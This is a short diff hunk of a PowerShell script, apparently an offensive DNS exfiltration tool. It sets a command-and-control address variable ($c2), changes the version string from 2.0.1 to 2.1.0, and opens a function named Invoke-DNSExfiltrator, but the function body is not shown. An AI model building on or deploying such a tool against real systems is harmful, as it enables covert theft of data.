@@ -1,6 +1,6 @@
 ﻿#global variables
 $c2="10.171.213.83"
-$version="2.0.1"
+$version="2.1.0"
 $ProgressPreference = 'SilentlyContinue'
 
 function Invoke-DNSExfiltrator
